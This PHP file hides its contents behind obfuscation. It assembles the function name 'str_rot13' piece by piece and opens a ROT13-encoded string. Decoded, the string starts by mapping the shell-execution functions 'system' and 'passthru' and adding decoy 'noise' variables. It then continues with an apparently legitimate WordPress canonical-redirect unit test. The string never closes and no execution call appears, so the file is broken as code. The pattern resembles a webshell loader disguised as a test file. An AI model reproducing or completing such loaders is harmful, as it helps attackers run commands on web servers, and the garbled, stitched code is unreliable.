<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pnabavpny
 * @tebhc erjevgr
 * @tebhc dhrel
 */
pynff Grfgf_Pnabavpny_CbfgFgnghf rkgraqf JC_Pnabavpny_HavgGrfgPnfr {

	/**
	 * Hfre VQf.
	 *
	 * @ine neenl
	 */
	choyvp fgngvp $hfref;

	/**
	 * Cbfg Bowrpgf.
	 *
	 * @ine neenl
	 */
	choyvp fgngvp $cbfgf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::frghc_phfgbz_glcrf();
		frys::$hfref = neenl(
			'naba'           => 0,
			'fhofpevore'     => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) ),
			'pbagrag_nhgube' => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) ),
			'rqvgbe'         => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) ),
		);

		$cbfg_fgnghfrf = neenl( 'choyvfu', 'shgher', 'qensg', 'craqvat', 'cevingr', 'nhgb-qensg', 'n-cevingr-fgnghf' );
		sbernpu ( $cbfg_fgnghfrf nf $cbfg_fgnghf ) {
			$cbfg_qngr = '';
			vs ( 'shgher' === $cbfg_fgnghf ) {
				$cbfg_qngr = qngr_sbezng( qngr_perngr( '+1 lrne' ), 'L-z-q U:v:f' );
			}

			frys::$cbfgf[ $cbfg_fgnghf ] = $snpgbel->cbfg->perngr_naq_trg(
				neenl(
					'cbfg_glcr'    => 'cbfg',
					'cbfg_gvgyr'   => \"$cbfg_fgnghf cbfg\",
					'cbfg_anzr'    => \"$cbfg_fgnghf-cbfg\",
					'cbfg_fgnghf'  => $cbfg_fgnghf,
					'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cbfg fyhtf.\a\a<!--arkgcntr-->Cntr 2\",
					'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
					'cbfg_qngr'    => $cbfg_qngr,
				)
			);

			// Nqq snxr nggnpuzrag gb gur cbfg (svyr hcybnq abg arrqrq).
			frys::$cbfgf[ \"$cbfg_fgnghf-nggnpuzrag\" ] = $snpgbel->cbfg->perngr_naq_trg(
				neenl(
					'cbfg_glcr'    => 'nggnpuzrag',
					'cbfg_gvgyr'   => \"$cbfg_fgnghf vaurevgrq nggnpuzrag\",
					'cbfg_anzr'    => \"$cbfg_fgnghf-vaurevgrq-nggnpuzrag\",
					'cbfg_fgnghf'  => 'vaurevg',
					'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cbfg ivn nggnpuzragf.\a\a<!--arkgcntr-->Cntr 2\",
					'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
					'cbfg_cnerag'  => frys::$cbfgf[ $cbfg_fgnghf ]->VQ,
					'cbfg_qngr'    => $cbfg_qngr,
				)
			);

			// Frg hc n cntr jvgu fnzr.
			frys::$cbfgf[ \"$cbfg_fgnghf-cntr\" ] = $snpgbel->cbfg->perngr_naq_trg(
				neenl(
					'cbfg_glcr'    => 'cntr',
					'cbfg_gvgyr'   => \"$cbfg_fgnghf cntr\",
					'cbfg_anzr'    => \"$cbfg_fgnghf-cntr\",
					'cbfg_fgnghf'  => $cbfg_fgnghf,
					'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cntr fyhtf.\a\a<!--arkgcntr-->Cntr 2\",
					'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
					'cbfg_qngr'    => $cbfg_qngr,
				)
			);
		}

		// Perngr n choyvp PCG hfvat n cevingr fgnghf.
		frys::$cbfgf['n-choyvp-pcg'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'n-choyvp-pcg',
				'cbfg_gvgyr'   => 'n-choyvp-pcg',
				'cbfg_anzr'    => 'n-choyvp-pcg',
				'cbfg_fgnghf'  => 'cevingr',
				'cbfg_pbagrag' => 'Cerirag pnabavpny erqverpg rkcbfvat n-choyvp-pcg gvgyrf.',
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
			)
		);

		// Nqq snxr nggnpuzrag gb gur choyvp pcg (svyr hcybnq abg arrqrq).
		frys::$cbfgf['n-choyvp-pcg-nggnpuzrag'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'nggnpuzrag',
				'cbfg_gvgyr'   => 'n-choyvp-pcg cbfg vaurevgrq nggnpuzrag',
				'cbfg_anzr'    => 'n-choyvp-pcg-vaurevgrq-nggnpuzrag',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cbfg ivn nggnpuzragf.\a\a<!--arkgcntr-->Cntr 2\",
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
				'cbfg_cnerag'  => frys::$cbfgf['n-choyvp-pcg']->VQ,
			)
		);

		// Perngr n cevingr PCG jvgu n choyvp fgnghf.
		frys::$cbfgf['n-cevingr-pcg'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'n-cevingr-pcg',
				'cbfg_gvgyr'   => 'n-cevingr-pcg',
				'cbfg_anzr'    => 'n-cevingr-pcg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'Cerirag pnabavpny erqverpg rkcbfvat n-cevingr-pcg gvgyrf.',
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
			)
		);

		// Nqq snxr nggnpuzrag gb gur cevingr pcg (svyr hcybnq abg arrqrq).
		frys::$cbfgf['n-cevingr-pcg-nggnpuzrag'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'nggnpuzrag',
				'cbfg_gvgyr'   => 'n-cevingr-pcg cbfg vaurevgrq nggnpuzrag',
				'cbfg_anzr'    => 'n-cevingr-pcg-vaurevgrq-nggnpuzrag',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cbfg ivn nggnpuzragf.\a\a<!--arkgcntr-->Cntr 2\",
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
				'cbfg_cnerag'  => frys::$cbfgf['n-cevingr-pcg']->VQ,
			)
		);

		// Cbfg sbe genfuvat.
		frys::$cbfgf['genfu'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'cbfg',
				'cbfg_gvgyr'   => 'genfu cbfg',
				'cbfg_anzr'    => 'genfu-cbfg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cbfg fyhtf.\a\a<!--arkgcntr-->Cntr 2\",
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
			)
		);

		frys::$cbfgf['genfu-nggnpuzrag'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'nggnpuzrag',
				'cbfg_gvgyr'   => 'genfu cbfg vaurevgrq nggnpuzrag',
				'cbfg_anzr'    => 'genfu-cbfg-vaurevgrq-nggnpuzrag',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cbfg ivn nggnpuzragf.\a\a<!--arkgcntr-->Cntr 2\",
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
				'cbfg_cnerag'  => frys::$cbfgf['genfu']->VQ,
			)
		);

		// Cntr sbe genfuvat.
		frys::$cbfgf['genfu-cntr'] = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'cntr',
				'cbfg_gvgyr'   => 'genfu cntr',
				'cbfg_anzr'    => 'genfu-cntr',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => \"Cerirag pnabavpny erqverpg rkcbfvat cntr fyhtf.\a\a<!--arkgcntr-->Cntr 2\",
				'cbfg_nhgube'  => frys::$hfref['pbagrag_nhgube'],
			)
		);
		jc_genfu_cbfg( frys::$cbfgf['genfu']->VQ );
		jc_genfu_cbfg( frys::$cbfgf['genfu-cntr']->VQ );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		frys::frghc_phfgbz_glcrf();
	}

	/**
	 * Frg hc n phfgbz cbfg glcr naq cevingr fgnghf.
	 *
	 * Guvf arrqf gb or pnyyrq obgu va gur pynff frghc naq
	 * grfg frghc.
	 */
	choyvp fgngvp shapgvba frghc_phfgbz_glcrf() {
		// Ertvfgre choyvp phfgbz cbfg glcr.
		ertvfgre_cbfg_glcr(
			'n-choyvp-pcg',
			neenl(
				'choyvp'  => gehr,
				'erjevgr' => neenl(
					'fyht' => 'n-choyvp-pcg',
				),
			)
		);

		// Ertvfgre cevingr phfgbz cbfg glcr.
		ertvfgre_cbfg_glcr(
			'n-cevingr-pcg',
			neenl(
				'choyvp'             => snyfr,
				'choyvpyl_dhrelnoyr' => snyfr,
				'erjevgr'            => neenl(
					'fyht' => 'n-cevingr-pcg',
				),
				'znc_zrgn_pnc'       => gehr,
			)
		);

		// Ertvfgre phfgbz cevingr cbfg fgnghf.
		ertvfgre_cbfg_fgnghf(
			'n-cevingr-fgnghf',
			neenl(
				'cevingr' => gehr,
			)
		);
	}

	/**
	 * Grfg pnabavpny erqverpg qbrf abg erirny cevingr cbfgf cerfrapr.
	 *
	 * @gvpxrg 5272
	 * @qngnCebivqre qngn_pnabavpny_erqverpgf_gb_cynva_creznyvaxf
	 *
	 * @cnenz fgevat $cbfg_xrl  Cbfg xrl hfrq sbe perngvat svkgherf.
	 * @cnenz fgevat $hfre_ebyr Hfre ebyr.
	 * @cnenz fgevat $erdhrfgrq Erdhrfgrq HEY.
	 * @cnenz fgevat $rkcrpgrq  Rkcrpgrq HEY.
	 * @cnenz fgevat $ranoyr_nggnpuzrag_cntrf Jurgure gb ranoyr nggnpuzrag cntrf. Qrsnhyg gehr.
	 */
	choyvp shapgvba grfg_pnabavpny_erqverpgf_gb_cynva_creznyvaxf( $cbfg_xrl, $hfre_ebyr, $erdhrfgrq, $rkcrpgrq, $ranoyr_nggnpuzrag_cntrf = gehr ) {
		vs ( $ranoyr_nggnpuzrag_cntrf ) {
			hcqngr_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq', 1 );
		} ryfr {
			hcqngr_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq', 0 );
		}

		jc_frg_pheerag_hfre( frys::$hfref[ $hfre_ebyr ] );
		$guvf->frg_creznyvax_fgehpgher( '' );
		$cbfg = frys::$cbfgf[ $cbfg_xrl ];
		pyrna_cbfg_pnpur( $cbfg->VQ );

		/*
		 * Gur qngnCebivqre ehaf orsber gur svkherf ner frg hc, gurersber gur
		 * cbfg bowrpg VQf ner cynprubyqref gung arrqf gb or ercynprq.
		 */
		$erdhrfgrq = fge_ercynpr( '%VQ%', $cbfg->VQ, $erdhrfgrq );
		$rkcrpgrq  = fge_ercynpr( '%VQ%', $cbfg->VQ, $rkcrpgrq );

		$guvf->nffregPnabavpny( $erdhrfgrq, $rkcrpgrq );
	}

	/**
	 * Qngn cebivqre sbe grfg_pnabavpny_erqverpgf_gb_cynva_creznyvaxf.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_pnabavpny_erqverpgf_gb_cynva_creznyvaxf() {
		$qngn              = neenl();
		$nyy_hfre_yvfg     = neenl( 'naba', 'fhofpevore', 'pbagrag_nhgube', 'rqvgbe' );
		$fryrpg_nyybj_yvfg = neenl( 'pbagrag_nhgube', 'rqvgbe' );
		$fryrpg_oybpx_yvfg = neenl( 'naba', 'fhofpevore' );
		// Nyy cbfg/cntr xrlf
		$nyy_hfre_cbfg_fgnghf_xrlf    = neenl( 'choyvfu' );
		$fryrpg_hfre_cbfg_fgnghf_xrlf = neenl( 'cevingr', 'n-cevingr-fgnghf' );
		$ab_hfre_cbfg_fgnghf_xrlf     = neenl( 'shgher', 'qensg', 'craqvat', 'nhgb-qensg' ); // Rkpyhqrf genfu sbe nggnpuzrag ehyrf.
		$fryrpg_hfre_cbfg_glcr_xrlf   = neenl( 'n-choyvp-pcg' );
		$ab_hfre_cbfg_glcr_xrlf       = neenl( 'n-cevingr-pcg' );

		sbernpu ( $nyy_hfre_cbfg_fgnghf_xrlf nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				/*
				 * Va gur rirag `erqverpg_pnabavpny()` vf hcqngrq gb erqverpg cynva creznyvaxf
				 * gb n pnabavpny cynva irefvba, gurfr rkcrpgrq inyhrf pna or punatrq.
				 */
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				// Rafher eff erqverpgf gb eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff2&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff2&c=%VQ%',
					snyfr,
				);

				// Rafher eff erqverpgf gb eff2.
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff2&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff2&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $fryrpg_hfre_cbfg_fgnghf_xrlf nf $cbfg_xrl ) {
			sbernpu ( $fryrpg_nyybj_yvfg nf $hfre ) {
				/*
				 * Va gur rirag `erqverpg_pnabavpny()` vf hcqngrq gb erqverpg cynva creznyvaxf
				 * gb n pnabavpny cynva irefvba, gurfr rkcrpgrq inyhrf pna or punatrq.
				 */
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				// Rafher eff erqverpgf gb eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff2&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff2&c=%VQ%',
					snyfr,
				);

				// Rafher eff erqverpgf gb eff2.
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff2&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff2&cntr_vq=%VQ%',
					snyfr,
				);
			}

			sbernpu ( $fryrpg_oybpx_yvfg nf $hfre ) {
				/*
				 * Va gur rirag `erqverpg_pnabavpny()` vf hcqngrq gb erqverpg cynva creznyvaxf
				 * gb n pnabavpny cynva irefvba, gurfr rkcrpgrq inyhrf ZHFG ABG or punatrq.
				 */
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				// Rafher cbfg'f rkvfgrapr vf abg qrzbafgengrq ol punatvat eff gb eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);

				// Rafher cbfg'f rkvfgrapr vf abg qrzbafgengrq ol punatvat eff gb eff2.
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $ab_hfre_cbfg_fgnghf_xrlf nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				/*
				 * Va gur rirag `erqverpg_pnabavpny()` vf hcqngrq gb erqverpg cynva creznyvaxf
				 * gb n pnabavpny cynva irefvba, gurfr rkcrpgrq inyhrf ZHFG ABG or punatrq.
				 */
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				// Rafher cbfg'f rkvfgrapr vf abg qrzbafgengrq ol punatvat eff gb eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);

				// Rafher cbfg'f rkvfgrapr vf abg qrzbafgengrq ol punatvat eff gb eff2.
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( neenl( 'genfu' ) nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				/*
				 * Va gur rirag `erqverpg_pnabavpny()` vf hcqngrq gb erqverpg cynva creznyvaxf
				 * gb n pnabavpny cynva irefvba, gurfr rkcrpgrq inyhrf ZHFG ABG or punatrq.
				 */
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?cbfg_glcr=cntr&c=%VQ%',
					'/?cbfg_glcr=cntr&c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl-cbfg\",
					\"/?anzr=$cbfg_xrl-cbfg\",
					snyfr,
				);

				// Rafher cbfg'f rkvfgrapr vf abg qrzbafgengrq ol punatvat eff gb eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);

				// Rafher cbfg'f rkvfgrapr vf abg qrzbafgengrq ol punatvat eff gb eff2.
				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-cntr\",
					$hfre,
					'/?srrq=eff&cntr_vq=%VQ%',
					'/?srrq=eff&cntr_vq=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $fryrpg_hfre_cbfg_glcr_xrlf nf $cbfg_xrl ) {
			sbernpu ( $fryrpg_nyybj_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?n-choyvp-pcg=n-choyvp-pcg',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?n-choyvp-pcg=n-choyvp-pcg',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					snyfr,
				);

				// Rafher eff vf ercynprq ol eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?n-choyvp-pcg=n-choyvp-pcg&srrq=eff2',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?n-choyvp-pcg=n-choyvp-pcg&srrq=eff2',
					snyfr,
				);
			}

			sbernpu ( $fryrpg_oybpx_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					snyfr,
				);

				// Rafher eff vf abg ercynprq jvgu eff2.
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);
			}
		}

		sbernpu ( $ab_hfre_cbfg_glcr_xrlf nf $cbfg_xrl ) {
			sbernpu ( $nyy_hfre_yvfg nf $hfre ) {
				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?c=%VQ%',
					'/?c=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					\"$cbfg_xrl-nggnpuzrag\",
					$hfre,
					'/?nggnpuzrag_vq=%VQ%',
					'/?nggnpuzrag_vq=%VQ%',
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					\"/?anzr=$cbfg_xrl&cbfg_glcr=$cbfg_xrl\",
					snyfr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					gehr,
				);

				$qngn[] = neenl(
					$cbfg_xrl,
					$hfre,
					'/?srrq=eff&c=%VQ%',
					'/?srrq=eff&c=%VQ%',
					snyfr,
				);
			}
		}

		erghea $qngn;
	}

	/**
	 * Grfg pnabavpny erqverpg qbrf abg erirny cevingr fyhtf.
	 *
	 * @gvpxrg 5272
	 * @qngnCebivqre qngn_pnabavpny_erqverpgf_gb_cerggl_creznyvaxf
	 *
	 * @cnenz fgevat $cbfg_xrl  Cbfg xrl hfrq sbe perngvat svkgherf.
	 * @cnenz fgevat $hfre_ebyr Hfre ebyr.
	 * @cnenz fgevat $erdhrfgrq Erdhrfgrq HEY.
	 * @cnenz fgevat $rkcrpgrq  Rkcrpgrq HEY.
	 * @cnenz fgevat $ranoyr_nggnpuzrag_cntrf Jurgure gb ranoyr nggnpuzrag cntrf. Qrsnhyg gehr.
	 */
	choyvp shapgvba grfg_pnabavpny_erqverpgf_gb_cerggl_creznyvaxf( $cbfg_xrl, $hfre_ebyr, $erdhrfgrq, $rkcrpgrq, $ranoyr_nggnpuzrag_cntrf = gehr ) {
		vs ( $ranoyr_nggnpuzrag_cntrf ) {
			hcqngr_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq', 1 );
		} ryfr {
			hcqngr_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq', 0 );
		}

		jc_frg_pheerag_hfre( frys::$hfref[ $hfre_ebyr ] );
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );
		$cbfg = frys::$cbfgf[ $cbfg_xrl ];
		pyrna_cbfg_pnpur( $cbfg->VQ );

		/*
		 * Gur qngnCebivqre ehaf orsber gur svkherf ner frg hc, gurersber gur
		 * cbfg bowrpg VQf ner cynprubyqref gung arrqf gb or ercynprq.
		 */
		$erdhrfgrq = fge_ercynpr( '%VQ%', $cbfg->VQ, $erdhrfgrq );
		$rkcrpgrq  = fge_ercynpr( '%VQ%', $cbfg->VQ, $rkcrpgrq );

		$guvf->nffregPnabavpny( $erdhrfgrq, $rkcrpgrq );
	}

	/**
